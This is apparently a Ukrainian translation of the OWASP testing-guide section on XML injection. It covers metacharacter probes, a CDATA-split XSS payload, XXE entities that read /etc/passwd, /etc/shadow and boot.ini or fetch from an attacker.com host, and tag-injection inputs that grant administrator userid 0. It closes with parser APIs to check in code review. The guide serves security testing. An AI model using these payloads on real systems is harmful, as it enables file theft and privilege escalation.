### Тестування на XML-ін'єкцію

ID  
WSTG-INPV-07

#### Підсумування

Тестування на XML-ін'єкцію полягає у спробі інжектувати XML-документ в додаток. Якщо XML-парсер не здійснює контекстну перевірку даних, тест може дати позитивний результат.

Цей розділ описує практичні приклади XML-ін'єкції. Спочатку буде визначено XML-стиль комунікації та пояснено його принципи роботи. Потім буде описано метод виявлення, в якому ми спробуємо вставити метасимволи XML. Після виконання першого кроку тестувальник отримає інформацію про структуру XML, що дозволить спробувати інжектувати XML-дані та теги (ін'єкція тегів).

#### Мети тестування
- Виявлення точок ін'єкції XML.
- Оцінка типів експлуатацій, які можуть бути досягнуті, та їх серйозності.

#### Як тестувати

Уявімо, що веб-додаток використовує XML-стиль комунікації для реєстрації користувачів. Це робиться шляхом створення та додавання нового `user>` вузла в файл `xmlDb`.

Приклад файлу xmlDB:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@example.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>stefan@example.com</mail>
    </user>
</users>
```
Коли користувач реєструється через HTML-форму, додаток отримує дані користувача у стандартному запиті, який буде передано як запит `GET`.

Наприклад, наступні значення:
```aiignore
Username: tony
Password: Un6R34kb!e
E-mail: tony@example.com
```

Призведуть до наступного запиту:

http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&e-mail=tony@example.com

Додаток тоді будує такий вузол:
```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>tony@example.com</mail>
</user>
```

Який буде доданий до xmlDB:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@example.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>stefan@example.com</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>tony@example.com</mail>
    </user>
</users>
```

### Виявлення 

Першим кроком для перевірки програми на наявність уразливості ін’єкції XML є спроба вставити метасимволи XML.

Метасимволи XML:

- Одинарні лапки: `'`- якщо цей символ не очищений, він може створити виняток під час синтаксичного аналізу XML, якщо введене значення буде частиною значення атрибута в тегу.
Як приклад, припустімо, що є такий атрибут:

`<node attrib='$inputValue'/>`

Отже, якщо:

`inputValue = foo'`

створюється, а потім вставляється як значення атрибута:

`<node attrib='foo''/>`

тоді результуючий XML-документ буде неправильно сформований.

Подвійні лапки: `"`цей символ має те саме значення, що й одинарні лапки, і його можна використовувати, якщо значення атрибута взято в подвійні лапки.
<node attrib="$inputValue"/>

Отже, якщо:

`$inputValue = foo"`

заміна дає:

`<node attrib="foo""/>`

і отриманий XML-документ недійсний.

Кутові дужки: `>` і `<` – шляхом додавання відкритої або закритої кутової дужки у введені користувачем дані, як показано нижче:
`Username = foo<`

програма створить новий вузол:
```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
але через присутність відкритого '<' результуючий документ XML є недійсним.

- Тег коментаря: `<!--/-->` ця послідовність символів інтерпретується як початок/кінець коментаря. Отже, вставивши один із них у параметр імені користувача:

`Username = foo<!--`

програма створить такий вузол:
```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

яка не буде дійсною послідовністю XML.

-Амперсанд: `&` амперсанд використовується в синтаксисі XML для представлення сутностей. Формат сутності: `&symbol;`. Сутність відображається на символі в наборі символів Unicode.

Наприклад:

`<tagnode>&lt;</tagnode>`

добре сформований і дійсний, і представляє `<` символ ASCII.

Якщо `&` сам не кодується за допомогою `&amp;`, його можна використовувати для перевірки введення XML.

Насправді, якщо надано такі вхідні дані:

`Username = &foo`

буде створено новий вузол:
```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
але, знову ж таки, документ недійсний: `&foo` він не закінчується, `;` а `&foo;`сутність не визначена.

- Роздільники розділів CDATA: `<!\[CDATA\[ / ]]>` - розділи CDATA використовуються для екранування блоків тексту, що містять символи, які інакше розпізнавались би як розмітка. Іншими словами, символи, укладені в розділ CDATA, не аналізуються аналізатором XML.
Наприклад, якщо необхідно представити рядок <foo>у текстовому вузлі, можна використати розділ CDATA:
```xml
<node>
    <![CDATA[<foo>]]>
</node>
```
так що це `<foo>` не буде аналізуватися як розмітка, а вважатиметься символьними даними.

Якщо вузол створюється таким чином:

`<username><![CDATA[<$userName]]></username>`

тестер може спробувати вставити кінцевий рядок CDATA ]]>, щоб спробувати зробити XML-документ недійсним.

`userName = ]]>`

це стане:

```xml
<username><![CDATA[]]>]]></username>
```

який не є дійсним фрагментом XML.

Інший тест пов'язаний з тегом CDATA. Припустімо, що документ XML обробляється для створення сторінки HTML. У цьому випадку розділювачі розділів CDATA можна просто видалити без додаткової перевірки їх вмісту. Потім можна вставити HTML-теги, які будуть включені в згенеровану сторінку, повністю минаючи існуючі процедури дезінфекції.

Розглянемо конкретний приклад. Припустімо, у нас є вузол, що містить певний текст, який буде відображено користувачеві.
```html
<html>
    $HTMLCode
</html>
```
Тоді зловмисник може надати такі дані:

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

і отримати такий вузол:
```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```
Під час обробки розділювачі розділів CDATA видаляються, створюючи такий HTML-код:
```xml
<script>
    alert('XSS')
</script>
```
У результаті програма стає вразливою до XSS.


Зовнішня сутність: набір дійсних сутностей можна розширити шляхом визначення нових сутностей. Якщо визначенням сутності є URI, сутність називається зовнішньою сутністю. Якщо не налаштовано інше, зовнішні об’єкти змушують аналізатор XML отримати доступ до ресурсу, визначеного URI, наприклад, файлу на локальній машині або на віддалених системах. Така поведінка піддає програму атакам XML eXternal Entity (XXE), які можуть використовуватися для виконання відмови в обслуговуванні локальної системи, отримання неавторизованого доступу до файлів на локальному комп’ютері, сканування віддалених машин і виконання відмови в обслуговуванні віддалених систем .

Щоб перевірити наявність уразливостей XXE, можна використати такі дані:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```
Цей тест може призвести до збою веб-сервера (у системі UNIX), якщо синтаксичний аналізатор XML спробує замінити сутність вмістом файлу /dev/random.

Інші корисні тести:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

#### Введення тегів
Після виконання першого кроку тестувальник матиме деяку інформацію про структуру документа XML. Тоді можна спробувати вставити XML-дані та теги. Ми покажемо приклад того, як це може призвести до атаки підвищення привілеїв.

Розглянемо попередню заявку. Вставивши такі значення:
```
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

програма створить новий вузол і додасть його до бази даних XML:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

Отриманий XML-файл добре сформований. Крім того, імовірно, що для користувача tony значення, пов’язане з тегом userid, є останнім, тобто 0 (ідентифікатор адміністратора). Іншими словами, ми ввели користувача з правами адміністратора.

Єдина проблема полягає в тому, що тег userid з’являється двічі в останньому вузлі користувача. Часто XML-документи пов’язані зі схемою або DTD і будуть відхилені, якщо вони їм не відповідають.

Припустімо, що XML-документ визначено таким DTD:
```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```
Зауважте, що вузол ідентифікатора користувача визначено з потужністю 1. У цьому випадку атака, яку ми показали раніше (та інші прості атаки), не працюватиме, якщо XML-документ перевіряється на відповідність його DTD перед початком будь-якої обробки.

Однак цю проблему можна вирішити, якщо тестувальник контролює значення деяких вузлів, що передують вузлу-порушнику (ідентифікатор користувача, у цьому прикладі). Насправді, тестувальник може закоментувати такий вузол, вставивши послідовність початку/закінчення коментаря:

```xml
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

У цьому випадку остаточна база даних XML виглядає так:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

Оригінальний `userid` вузол було закоментовано, залишивши лише введений. Тепер документ відповідає правилам DTD.

#### Огляд вихідного коду

Наступний API Java може бути вразливим до XXE, якщо його неправильно налаштовано.
```
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Перевірте вихідний код, якщо docType, зовнішній DTD і сутності зовнішніх параметрів встановлено як заборонене використання.

- Шпаргалка щодо запобігання зовнішній сутності XML (XXE).
Крім того, офісний зчитувач Java POI може бути вразливим до XXE, якщо версія нижче 3.10.1.

Версію бібліотеки POI можна визначити за назвою файлу JAR. Наприклад,

-`poi-3.8.jar`
-`poi-ooxml-3.8.jar`
Наступне ключове слово вихідного коду може застосовуватися до C.

-`libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO`
-`libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader`
